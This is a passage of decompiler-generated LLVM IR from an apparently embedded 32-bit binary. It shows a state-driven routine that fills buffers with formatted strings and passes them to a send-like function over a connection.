  %v1_a444 = add i32 %v0_a444, 1042
  %v2_a444 = inttoptr i32 %v1_a444 to i8*
  %v3_a444 = load i8, i8* %v2_a444, align 1
  %v4_a444 = zext i8 %v3_a444 to i32
  %v2_a448 = load i32, i32* @global_var_1d4d4.158, align 4
  store i32 %v2_a448, i32* @r6, align 4
  %v1_a44c = add nuw nsw i32 %v4_a444, 1
  store i32 %v1_a44c, i32* %r3.global-to-local, align 4
  %v1_a450 = urem i32 %v1_a44c, 256
  %v2_a47855 = icmp eq i32 %v2_a448, 0
  br i1 %v2_a47855, label %dec_label_pc_a480, label %dec_label_pc_a458

dec_label_pc_a458:                                ; preds = %dec_label_pc_a3ec, %dec_label_pc_a474
  %v0_a474 = phi i32 [ %v3_a474, %dec_label_pc_a474 ], [ %v2_a448, %dec_label_pc_a3ec ]
  %v1_a458 = inttoptr i32 %v0_a474 to i32*
  %v2_a458 = load i32, i32* %v1_a458, align 4
  %v1_a45c = urem i32 %v2_a458, 16777216
  store i32 %v1_a45c, i32* %r3.global-to-local, align 4
  %v2_a460 = icmp eq i32 %v1_a45c, 0
  br i1 %v2_a460, label %dec_label_pc_a474, label %dec_label_pc_a468

dec_label_pc_a468:                                ; preds = %dec_label_pc_a458
  %v1_a468 = add i32 %v0_a474, 2
  %v2_a468 = inttoptr i32 %v1_a468 to i8*
  %v3_a468 = load i8, i8* %v2_a468, align 1
  %v4_a468 = zext i8 %v3_a468 to i32
  store i32 %v4_a468, i32* %r3.global-to-local, align 4
  %v9_a46c = icmp eq i32 %v4_a468, %v1_a450
  br i1 %v9_a46c, label %dec_label_pc_a484, label %dec_label_pc_a474

dec_label_pc_a474:                                ; preds = %dec_label_pc_a468, %dec_label_pc_a458
  %v1_a474 = add i32 %v0_a474, 8
  %v2_a474 = inttoptr i32 %v1_a474 to i32*
  %v3_a474 = load i32, i32* %v2_a474, align 4
  store i32 %v3_a474, i32* @r6, align 4
  %v2_a478 = icmp eq i32 %v3_a474, 0
  br i1 %v2_a478, label %dec_label_pc_a480, label %dec_label_pc_a458

dec_label_pc_a480:                                ; preds = %dec_label_pc_a474, %dec_label_pc_a3ec
  store i32 %stack_var_-2336.6.ph, i32* @r6, align 4
  br label %dec_label_pc_a484

dec_label_pc_a484:                                ; preds = %dec_label_pc_a468, %dec_label_pc_a480
  %v0_a484 = phi i32 [ %stack_var_-2336.6.ph, %dec_label_pc_a480 ], [ %v0_a474, %dec_label_pc_a468 ]
  %v1_a484 = add i32 %v0_a484, 4
  %v2_a484 = inttoptr i32 %v1_a484 to i32*
  %v3_a484 = load i32, i32* %v2_a484, align 4
  store i32 %v3_a484, i32* @r1, align 4
  store i32 %v1_a3f4, i32* %r0.global-to-local, align 4
  %v3_a48c = call i32 @function_aad8(i8* %v2_a414, i32 %v3_a484)
  store i32 ptrtoint ([17 x i8]* @global_var_13fc0.183 to i32), i32* @r1, align 4
  store i32 %v1_a3f4, i32* %r0.global-to-local, align 4
  %v4_a498 = call i32 @function_aad8(i8* %v2_a414, i32 ptrtoint ([17 x i8]* @global_var_13fc0.183 to i32))
  store i32 %v1_a3f4, i32* @r0, align 4
  %v0_a4a0 = load i32, i32* @r5, align 4
  %v1_a4a0 = add i32 %v0_a4a0, 8
  %v2_a4a0 = inttoptr i32 %v1_a4a0 to i32*
  %v3_a4a0 = load i32, i32* %v2_a4a0, align 4
  store i32 %v3_a4a0, i32* @r4, align 4
  %v0_a4a4 = call i32 @function_aab8()
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v1_a3f4, i32* %r1.global-to-local, align 4
  %v0_a4b4 = load i32, i32* @r4, align 4
  store i32 %v0_a4b4, i32* %r0.global-to-local, align 4
  %v4_a4b8 = call i32 @function_c4d8(i32 %v0_a4b4, i32 %v1_a3f4, i32 %v0_a4a4, i32 16384)
  store i32 %v4_a4b8, i32* %r0.global-to-local, align 4
  %tmp181 = icmp slt i32 %v4_a4b8, 1
  %v5_a4c8 = load i32, i32* @r5, align 4
  br i1 %tmp181, label %.thread112, label %bb182

.thread112:                                       ; preds = %dec_label_pc_a484
  store i32 %v5_a4c8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %bb183

bb182:                                            ; preds = %dec_label_pc_a484
  %v6_a4c0 = add i32 %v5_a4c8, 1042
  %v7_a4c0 = inttoptr i32 %v6_a4c0 to i8*
  %v8_a4c0 = load i8, i8* %v7_a4c0, align 1
  %v9_a4c0 = zext i8 %v8_a4c0 to i32
  %v6_a4c4 = add nuw nsw i32 %v9_a4c0, 1
  store i32 %v6_a4c4, i32* %r3.global-to-local, align 4
  store i32 %v5_a4c8, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v6_a4d8 = trunc i32 %v6_a4c4 to i8
  store i8 %v6_a4d8, i8* %v7_a4c0, align 1
  %v0_a4dc.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_a4dc.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t228 = trunc i32 %v1_a4dc.pre to i8
  br label %bb183

bb183:                                            ; preds = %.thread112, %bb182
  %v1_a4dc.off0 = phi i8 [ %extract.t228, %bb182 ], [ 1, %.thread112 ]
  %v0_a4dc = phi i32 [ %v0_a4dc.pre, %bb182 ], [ %v5_a4c8, %.thread112 ]
  %v3_a4dc = call i32 @function_9aa8(i32 %v0_a4dc, i8 %v1_a4dc.off0)
  store i32 %v3_a4dc, i32* %r0.global-to-local, align 4
  %v0_a4e0 = load i32, i32* @r6, align 4
  br label %dec_label_pc_a89c

dec_label_pc_a4e8:                                ; preds = %dec_label_pc_a8c0
  store i32 1024, i32* @r2, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_a4f0 = ptrtoint i32* %stack_var_-1284 to i32
  store i32 %v1_a4f0, i32* %r0.global-to-local, align 4
  %v4_a4f4 = call i32 @function_ab54(i32 %v1_a4f0, i8 0, i32 1024)
  store i32 ptrtoint ([27 x i8]* @global_var_13fd4.185 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_a4f0, i32* @r0, align 4
  %v3_a500 = call i32 @function_ab24(i32 %v1_a4f0, i32 ptrtoint ([27 x i8]* @global_var_13fd4.185 to i32))
  store i32 %v3_a500, i32* %r0.global-to-local, align 4
  %v0_a504 = load i32, i32* @r5, align 4
  %v1_a504 = add i32 %v0_a504, 1044
  %v2_a504 = inttoptr i32 %v1_a504 to i32*
  %v3_a504 = load i32, i32* %v2_a504, align 4
  store i32 %v3_a504, i32* %r3.global-to-local, align 4
  store i32 %v1_a4f0, i32* %r0.global-to-local, align 4
  %v1_a50c = inttoptr i32 %v3_a504 to i32*
  %v2_a50c = load i32, i32* %v1_a50c, align 4
  store i32 %v2_a50c, i32* @r1, align 4
  %v2_a510 = bitcast i32* %stack_var_-1284 to i8*
  %v3_a510 = call i32 @function_aad8(i8* %v2_a510, i32 %v2_a50c)
  store i32 ptrtoint ([11 x i8]* @global_var_13f5c.179 to i32), i32* @r1, align 4
  store i32 %v1_a4f0, i32* %r0.global-to-local, align 4
  %v4_a51c = call i32 @function_aad8(i8* %v2_a510, i32 ptrtoint ([11 x i8]* @global_var_13f5c.179 to i32))
  store i32 %v4_a51c, i32* %r0.global-to-local, align 4
  %v0_a520 = load i32, i32* @r5, align 4
  %v1_a520 = add i32 %v0_a520, 1044
  %v2_a520 = inttoptr i32 %v1_a520 to i32*
  %v3_a520 = load i32, i32* %v2_a520, align 4
  store i32 %v3_a520, i32* %r3.global-to-local, align 4
  store i32 %v1_a4f0, i32* %r0.global-to-local, align 4
  %v1_a528 = add i32 %v3_a520, 4
  %v2_a528 = inttoptr i32 %v1_a528 to i32*
  %v3_a528 = load i32, i32* %v2_a528, align 4
  store i32 %v3_a528, i32* @r1, align 4
  %v3_a52c = call i32 @function_aad8(i8* %v2_a510, i32 %v3_a528)
  store i32 ptrtoint ([14 x i8]* @global_var_13ff0.187 to i32), i32* @r1, align 4
  store i32 %v1_a4f0, i32* %r0.global-to-local, align 4
  %v4_a538 = call i32 @function_aad8(i8* %v2_a510, i32 ptrtoint ([14 x i8]* @global_var_13ff0.187 to i32))
  store i32 %v1_a4f0, i32* @r0, align 4
  %v0_a540 = load i32, i32* @r5, align 4
  %v1_a540 = add i32 %v0_a540, 8
  %v2_a540 = inttoptr i32 %v1_a540 to i32*
  %v3_a540 = load i32, i32* %v2_a540, align 4
  store i32 %v3_a540, i32* @r4, align 4
  %v0_a544 = call i32 @function_aab8()
  store i32 %v1_a4f0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a554 = load i32, i32* @r4, align 4
  store i32 %v0_a554, i32* %r0.global-to-local, align 4
  %v4_a558 = call i32 @function_c4d8(i32 %v0_a554, i32 %v1_a4f0, i32 %v0_a544, i32 16384)
  store i32 %v4_a558, i32* %r0.global-to-local, align 4
  %tmp184 = icmp slt i32 %v4_a558, 1
  br i1 %tmp184, label %dec_label_pc_a878, label %dec_label_pc_a564

dec_label_pc_a564:                                ; preds = %dec_label_pc_a4e8
  store i32 ptrtoint (i16** @global_var_1d4d0.133 to i32), i32* %ip.global-to-local, align 4
  %v0_a568 = load i32, i32* @r5, align 4
  %v1_a568 = add i32 %v0_a568, 1042
  %v2_a568 = inttoptr i32 %v1_a568 to i8*
  %v3_a568 = load i8, i8* %v2_a568, align 1
  %v4_a568 = zext i8 %v3_a568 to i32
  %v1_a570 = add nuw nsw i32 %v4_a568, 1
  store i32 ptrtoint (i16* @global_var_1d4d1.136 to i32), i32* %r3.global-to-local, align 4
  %v9_a578 = icmp eq i32 %v1_a570, ptrtoint (i16* @global_var_1d4d1.136 to i32)
  br i1 %v9_a578, label %dec_label_pc_a884, label %dec_label_pc_a580

dec_label_pc_a580:                                ; preds = %dec_label_pc_a564
  %v1_a580 = add i32 %v0_a568, 17
  %v2_a580 = inttoptr i32 %v1_a580 to i8*
  %v3_a580 = load i8, i8* %v2_a580, align 1
  %v4_a580 = zext i8 %v3_a580 to i32
  store i32 %v4_a580, i32* %r3.global-to-local, align 4
  %v7_a584 = icmp eq i8 %v3_a580, 3
  br i1 %v7_a584, label %dec_label_pc_a778, label %dec_label_pc_a89c

dec_label_pc_a590:                                ; preds = %dec_label_pc_a8c0
  %v1_a590 = ptrtoint i32* %stack_var_-1284 to i32
  store i32 %v1_a590, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v4_a59c = call i32 @function_ab54(i32 %v1_a590, i8 0, i32 1024)
  store i32 62, i32* @r3, align 4
  store i32 88, i32* %ip.global-to-local, align 4
  store i32 %v1_a590, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([860 x i8]* @global_var_14000.190 to i32), i32* %r1.global-to-local, align 4
  %v4_a5c0 = call i32 @function_b3e8(i32 %v1_a590, i32 ptrtoint ([860 x i8]* @global_var_14000.190 to i32), i32 185)
  br label %dec_label_pc_a850

dec_label_pc_a5c8:                                ; preds = %dec_label_pc_a8c0
  %v1_a5c8 = add i32 %v4_9ed4, 17
  %v2_a5c8 = inttoptr i32 %v1_a5c8 to i8*
  %v3_a5c8 = load i8, i8* %v2_a5c8, align 1
  %v4_a5c8 = zext i8 %v3_a5c8 to i32
  store i32 %v4_a5c8, i32* %r3.global-to-local, align 4
  %v7_a5cc = icmp eq i8 %v3_a5c8, 2
  br i1 %v7_a5cc, label %.thread41, label %dec_label_pc_a5dc

.thread41:                                        ; preds = %dec_label_pc_a5c8
  store i32 %v4_9ed4, i32* @r0, align 4
  store i32 10, i32* @r1, align 4
  br label %dec_label_pc_a1f4

dec_label_pc_a5dc:                                ; preds = %dec_label_pc_a5c8
  %v7_a5dc = icmp eq i8 %v3_a5c8, 3
  br i1 %v7_a5dc, label %.thread44, label %dec_label_pc_a5ec

.thread44:                                        ; preds = %dec_label_pc_a5dc
  store i32 %v4_9ed4, i32* @r0, align 4
  store i32 13, i32* @r1, align 4
  br label %dec_label_pc_a1f4

dec_label_pc_a5ec:                                ; preds = %dec_label_pc_a5dc
  store i32 %stack_var_-2324.8.ph, i32* @r0, align 4
  %v1_a5f0 = add i32 %v4_9ed4, 8
  %v2_a5f0 = inttoptr i32 %v1_a5f0 to i32*
  %v3_a5f0 = load i32, i32* %v2_a5f0, align 4
  store i32 %v3_a5f0, i32* @r4, align 4
  %v0_a5f4 = call i32 @function_aab8()
  store i32 %stack_var_-2324.8.ph, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a604 = load i32, i32* @r4, align 4
  store i32 %v0_a604, i32* %r0.global-to-local, align 4
  %v4_a608 = call i32 @function_c4d8(i32 %v0_a604, i32 %stack_var_-2324.8.ph, i32 %v0_a5f4, i32 16384)
  store i32 %v4_a608, i32* %r0.global-to-local, align 4
  %v8_a610 = icmp sgt i32 %v4_a608, 1
  br i1 %v8_a610, label %dec_label_pc_a878, label %dec_label_pc_a614

dec_label_pc_a614:                                ; preds = %dec_label_pc_a5ec
  store i32 ptrtoint ([3 x i8]* @global_var_1435c.192 to i32), i32* %r1.global-to-local, align 4
  %v0_a618 = load i32, i32* @r5, align 4
  %v1_a618 = add i32 %v0_a618, 8
  %v2_a618 = inttoptr i32 %v1_a618 to i32*
  %v3_a618 = load i32, i32* %v2_a618, align 4
  store i32 %v3_a618, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_a624 = call i32 @function_c4d8(i32 %v3_a618, i32 ptrtoint ([3 x i8]* @global_var_1435c.192 to i32), i32 2, i32 16384)
  store i32 %v5_a624, i32* %r0.global-to-local, align 4
  %tmp185 = icmp slt i32 %v5_a624, 1
  br i1 %tmp185, label %dec_label_pc_a878, label %.thread114

.thread114:                                       ; preds = %dec_label_pc_a614
  %v5_a62c = load i32, i32* @r5, align 4
  store i32 %v5_a62c, i32* @r0, align 4
  store i32 8, i32* @r1, align 4
  br label %dec_label_pc_a1f4

dec_label_pc_a63c:                                ; preds = %dec_label_pc_a8c0
  store i32 %v4_9ed4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([14 x i8]* @global_var_14360.194 to i32), i32* %r1.global-to-local, align 4
  %v3_a644 = call i32 @function_9994(i32 %v4_9ed4, i32 ptrtoint ([14 x i8]* @global_var_14360.194 to i32))
  store i32 %v3_a644, i32* %r0.global-to-local, align 4
  %v2_a648 = icmp eq i32 %v3_a644, 0
  br i1 %v2_a648, label %dec_label_pc_a650, label %dec_label_pc_a778

dec_label_pc_a650:                                ; preds = %dec_label_pc_a63c, %dec_label_pc_a2bc
  %v0_a650 = load i32, i32* @r5, align 4
  store i32 %v0_a650, i32* @r0, align 4
  store i32 7, i32* @r1, align 4
  br label %dec_label_pc_a898

dec_label_pc_a65c:                                ; preds = %dec_label_pc_a8c0
  %v1_a65c = ptrtoint i32* %stack_var_-1284 to i32
  store i32 %v1_a65c, i32* @r0, align 4
  %v1_a660 = add i32 %v4_9ed4, 8
  %v2_a660 = inttoptr i32 %v1_a660 to i32*
  %v3_a660 = load i32, i32* %v2_a660, align 4
  store i32 %v3_a660, i32* @r4, align 4
  %v0_a664 = call i32 @function_aab8()
  store i32 %v1_a65c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a674 = load i32, i32* @r4, align 4
  store i32 %v0_a674, i32* %r0.global-to-local, align 4
  %v4_a678 = call i32 @function_c4d8(i32 %v0_a674, i32 %v1_a65c, i32 %v0_a664, i32 16384)
  store i32 %v4_a678, i32* %r0.global-to-local, align 4
  %tmp186 = icmp slt i32 %v4_a678, 1
  br i1 %tmp186, label %dec_label_pc_a878, label %dec_label_pc_a684

dec_label_pc_a684:                                ; preds = %dec_label_pc_a65c
  %v0_a684 = load i32, i32* @r5, align 4
  %v1_a684 = add i32 %v0_a684, 8
  %v2_a684 = inttoptr i32 %v1_a684 to i32*
  %v3_a684 = load i32, i32* %v2_a684, align 4
  store i32 %v3_a684, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1435c.192 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_a694 = call i32 @function_c4d8(i32 %v3_a684, i32 ptrtoint ([3 x i8]* @global_var_1435c.192 to i32), i32 2, i32 16384)
  store i32 %v5_a694, i32* %r0.global-to-local, align 4
  %v1_a698 = icmp slt i32 %v5_a694, 0
  br i1 %v1_a698, label %dec_label_pc_a878, label %dec_label_pc_a7fc

dec_label_pc_a6a4:                                ; preds = %dec_label_pc_a8c0
  store i32 %stack_var_-2320.8.ph, i32* @r0, align 4
  %v1_a6a8 = add i32 %v4_9ed4, 8
  %v2_a6a8 = inttoptr i32 %v1_a6a8 to i32*
  %v3_a6a8 = load i32, i32* %v2_a6a8, align 4
  store i32 %v3_a6a8, i32* @r4, align 4
  %v0_a6ac = call i32 @function_aab8()
  store i32 %stack_var_-2320.8.ph, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a6bc = load i32, i32* @r4, align 4
  store i32 %v0_a6bc, i32* %r0.global-to-local, align 4
  %v4_a6c0 = call i32 @function_c4d8(i32 %v0_a6bc, i32 %stack_var_-2320.8.ph, i32 %v0_a6ac, i32 16384)
  store i32 %v4_a6c0, i32* %r0.global-to-local, align 4
  %v1_a6c4 = icmp slt i32 %v4_a6c0, 0
  br i1 %v1_a6c4, label %dec_label_pc_a878, label %dec_label_pc_a6cc

dec_label_pc_a6cc:                                ; preds = %dec_label_pc_a6a4
  %v0_a6cc = load i32, i32* @r5, align 4
  %v1_a6cc = add i32 %v0_a6cc, 8
  %v2_a6cc = inttoptr i32 %v1_a6cc to i32*
  %v3_a6cc = load i32, i32* %v2_a6cc, align 4
  store i32 %v3_a6cc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1435c.192 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_a6dc = call i32 @function_c4d8(i32 %v3_a6cc, i32 ptrtoint ([3 x i8]* @global_var_1435c.192 to i32), i32 2, i32 16384)
  store i32 %v5_a6dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a878

dec_label_pc_a6e4:                                ; preds = %dec_label_pc_a8c0
  %v1_a6e4 = add i32 %v4_9ed4, 17
  %v2_a6e4 = inttoptr i32 %v1_a6e4 to i8*
  %v3_a6e4 = load i8, i8* %v2_a6e4, align 1
  %v4_a6e4 = zext i8 %v3_a6e4 to i32
  store i32 %v4_a6e4, i32* %r3.global-to-local, align 4
  %v7_a6e8 = icmp eq i8 %v3_a6e4, 2
  br i1 %v7_a6e8, label %.thread47, label %dec_label_pc_a6f8

.thread47:                                        ; preds = %dec_label_pc_a6e4
  store i32 %v4_9ed4, i32* @r0, align 4
  store i32 7, i32* @r1, align 4
  br label %dec_label_pc_a1f4

dec_label_pc_a6f8:                                ; preds = %dec_label_pc_a6e4
  %v7_a6f8 = icmp eq i8 %v3_a6e4, 3
  br i1 %v7_a6f8, label %.thread50, label %dec_label_pc_a708

.thread50:                                        ; preds = %dec_label_pc_a6f8
  store i32 %v4_9ed4, i32* @r0, align 4
  store i32 11, i32* @r1, align 4
  br label %dec_label_pc_a1f4

dec_label_pc_a708:                                ; preds = %dec_label_pc_a6f8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v1_a710 = ptrtoint i32* %stack_var_-1284 to i32
  store i32 %v1_a710, i32* %r0.global-to-local, align 4
  %v4_a714 = call i32 @function_ab54(i32 %v1_a710, i8 0, i32 1024)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a71c = call i32 @function_81d0(i32 22)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a724 = call i32 @function_83b4(i32 22)
  store i32 %v1_a724, i32* @r4, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a730 = call i32 @function_83b4(i32 22)
  %v0_a734 = load i32, i32* @r4, align 4
  store i32 %v1_a730, i32* @r3, align 4
  store i32 ptrtoint ([852 x i8]* @global_var_14370.196 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_a710, i32* %r0.global-to-local, align 4
  %v4_a744 = call i32 @function_b3e8(i32 %v1_a710, i32 ptrtoint ([852 x i8]* @global_var_14370.196 to i32), i32 %v0_a734)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a74c = call i32 @function_82c0(i32 22)
  store i32 %v1_a710, i32* @r0, align 4
  %v0_a754 = load i32, i32* @r5, align 4
  %v1_a754 = add i32 %v0_a754, 8
  %v2_a754 = inttoptr i32 %v1_a754 to i32*
  %v3_a754 = load i32, i32* %v2_a754, align 4
  store i32 %v3_a754, i32* @r4, align 4
  %v0_a758 = call i32 @function_aab8()
  store i32 %v1_a710, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a768 = load i32, i32* @r4, align 4
  store i32 %v0_a768, i32* %r0.global-to-local, align 4
  %v4_a76c = call i32 @function_c4d8(i32 %v0_a768, i32 %v1_a710, i32 %v0_a758, i32 16384)
  store i32 %v4_a76c, i32* %r0.global-to-local, align 4
  %tmp187 = icmp slt i32 %v4_a76c, 1
  br i1 %tmp187, label %dec_label_pc_a878, label %dec_label_pc_a778

dec_label_pc_a778:                                ; preds = %dec_label_pc_a580, %dec_label_pc_a3c0, %dec_label_pc_a63c, %dec_label_pc_a708
  %v0_a778 = load i32, i32* @r5, align 4
  store i32 %v0_a778, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a1c4

dec_label_pc_a784:                                ; preds = %dec_label_pc_a8c0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v1_a78c = ptrtoint i32* %stack_var_-1284 to i32
  store i32 %v1_a78c, i32* %r0.global-to-local, align 4
  %v4_a790 = call i32 @function_ab54(i32 %v1_a78c, i8 0, i32 1024)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a798 = call i32 @function_81d0(i32 22)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a7a0 = call i32 @function_83b4(i32 22)
  store i32 62, i32* @r3, align 4
  store i32 ptrtoint ([880 x i8]* @global_var_146c4.198 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_a78c, i32* %r0.global-to-local, align 4
  store i32 88, i32* %ip.global-to-local, align 4
  %v4_a7c8 = call i32 @function_b3e8(i32 %v1_a78c, i32 ptrtoint ([880 x i8]* @global_var_146c4.198 to i32), i32 185)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a7d0 = call i32 @function_82c0(i32 22)
  store i32 %v1_a78c, i32* @r0, align 4
  %v0_a7d8 = load i32, i32* @r5, align 4
  %v1_a7d8 = add i32 %v0_a7d8, 8
  %v2_a7d8 = inttoptr i32 %v1_a7d8 to i32*
  %v3_a7d8 = load i32, i32* %v2_a7d8, align 4
  store i32 %v3_a7d8, i32* @r4, align 4
  %v0_a7dc = call i32 @function_aab8()
  store i32 %v1_a78c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a7ec = load i32, i32* @r4, align 4
  store i32 %v0_a7ec, i32* %r0.global-to-local, align 4
  %v4_a7f0 = call i32 @function_c4d8(i32 %v0_a7ec, i32 %v1_a78c, i32 %v0_a7dc, i32 16384)
  store i32 %v4_a7f0, i32* %r0.global-to-local, align 4
  %tmp188 = icmp slt i32 %v4_a7f0, 1
  br i1 %tmp188, label %dec_label_pc_a878, label %dec_label_pc_a7fc

dec_label_pc_a7fc:                                ; preds = %dec_label_pc_a684, %dec_label_pc_a784
  %v0_a7fc = load i32, i32* @r5, align 4
  store i32 %v0_a7fc, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a1c4

dec_label_pc_a808:                                ; preds = %dec_label_pc_a8c0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v1_a810 = ptrtoint i32* %stack_var_-1284 to i32
  store i32 %v1_a810, i32* %r0.global-to-local, align 4
  %v4_a814 = call i32 @function_ab54(i32 %v1_a810, i8 0, i32 1024)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a81c = call i32 @function_81d0(i32 22)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a824 = call i32 @function_83b4(i32 22)
  store i32 %v1_a824, i32* @r4, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a830 = call i32 @function_83b4(i32 22)
  %v0_a834 = load i32, i32* @r4, align 4
  store i32 %v1_a830, i32* @r3, align 4
  store i32 ptrtoint ([852 x i8]* @global_var_14a34.200 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_a810, i32* %r0.global-to-local, align 4
  %v4_a844 = call i32 @function_b3e8(i32 %v1_a810, i32 ptrtoint ([852 x i8]* @global_var_14a34.200 to i32), i32 %v0_a834)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a84c = call i32 @function_82c0(i32 22)
  br label %dec_label_pc_a850

dec_label_pc_a850:                                ; preds = %dec_label_pc_a590, %dec_label_pc_a808
  %v1_a850.pre-phi = phi i32 [ %v1_a590, %dec_label_pc_a590 ], [ %v1_a810, %dec_label_pc_a808 ]
  store i32 %v1_a850.pre-phi, i32* @r0, align 4
  %v0_a854 = load i32, i32* @r5, align 4
  %v1_a854 = add i32 %v0_a854, 8
  %v2_a854 = inttoptr i32 %v1_a854 to i32*
  %v3_a854 = load i32, i32* %v2_a854, align 4
  store i32 %v3_a854, i32* @r4, align 4
  %v0_a858 = call i32 @function_aab8()
  store i32 %v1_a850.pre-phi, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a868 = load i32, i32* @r4, align 4
  store i32 %v0_a868, i32* %r0.global-to-local, align 4
  %v4_a86c = call i32 @function_c4d8(i32 %v0_a868, i32 %v1_a850.pre-phi, i32 %v0_a858, i32 16384)
  store i32 %v4_a86c, i32* %r0.global-to-local, align 4
  %v5_a874 = icmp sgt i32 %v4_a86c, 0
  br i1 %v5_a874, label %dec_label_pc_a850.dec_label_pc_a884_crit_edge, label %dec_label_pc_a878

dec_label_pc_a850.dec_label_pc_a884_crit_edge:    ; preds = %dec_label_pc_a850
  %v0_a884.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a884

dec_label_pc_a878:                                ; preds = %dec_label_pc_a614, %dec_label_pc_a294, %dec_label_pc_a0e8, %dec_label_pc_a784, %dec_label_pc_a708, %dec_label_pc_a6a4, %dec_label_pc_a684, %dec_label_pc_a65c, %dec_label_pc_a5ec, %dec_label_pc_a850, %dec_label_pc_a4e8, %dec_label_pc_a3c0, %dec_label_pc_a6cc
  %stack_var_-2336.4 = phi i32 [ %stack_var_-2336.6.ph, %dec_label_pc_a4e8 ], [ %stack_var_-2336.6.ph, %dec_label_pc_a6a4 ], [ %stack_var_-2336.6.ph, %dec_label_pc_a6cc ], [ %stack_var_-2336.6.ph, %dec_label_pc_a850 ], [ %stack_var_-2336.6.ph, %dec_label_pc_a65c ], [ %stack_var_-2336.6.ph, %dec_label_pc_a684 ], [ %stack_var_-2336.6.ph, %dec_label_pc_a3c0 ], [ %stack_var_-2336.6.ph, %dec_label_pc_a784 ], [ %stack_var_-2336.6.ph, %dec_label_pc_a708 ], [ %stack_var_-2336.6.ph, %dec_label_pc_a5ec ], [ %stack_var_-2336.6.ph, %dec_label_pc_a0e8 ], [ %stack_var_-2336.3, %dec_label_pc_a294 ], [ %stack_var_-2336.6.ph, %dec_label_pc_a614 ]
  %stack_var_-2316.4 = phi i16* [ %stack_var_-2316.6.lcssa, %dec_label_pc_a4e8 ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a6a4 ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a6cc ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a850 ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a65c ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a684 ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a3c0 ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a784 ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a708 ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a5ec ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a0e8 ], [ %stack_var_-2316.3, %dec_label_pc_a294 ], [ %stack_var_-2316.6.lcssa, %dec_label_pc_a614 ]
  %stack_var_-2328.7 = phi i16 [ %stack_var_-2328.9.ph, %dec_label_pc_a4e8 ], [ %stack_var_-2328.9.ph, %dec_label_pc_a6a4 ], [ %stack_var_-2328.9.ph, %dec_label_pc_a6cc ], [ %stack_var_-2328.9.ph, %dec_label_pc_a850 ], [ %stack_var_-2328.9.ph, %dec_label_pc_a65c ], [ %stack_var_-2328.9.ph, %dec_label_pc_a684 ], [ %stack_var_-2328.9.ph, %dec_label_pc_a3c0 ], [ %stack_var_-2328.9.ph, %dec_label_pc_a784 ], [ %stack_var_-2328.9.ph, %dec_label_pc_a708 ], [ %stack_var_-2328.9.ph, %dec_label_pc_a5ec ], [ %stack_var_-2328.9.ph, %dec_label_pc_a0e8 ], [ %stack_var_-2328.6, %dec_label_pc_a294 ], [ %stack_var_-2328.9.ph, %dec_label_pc_a614 ]
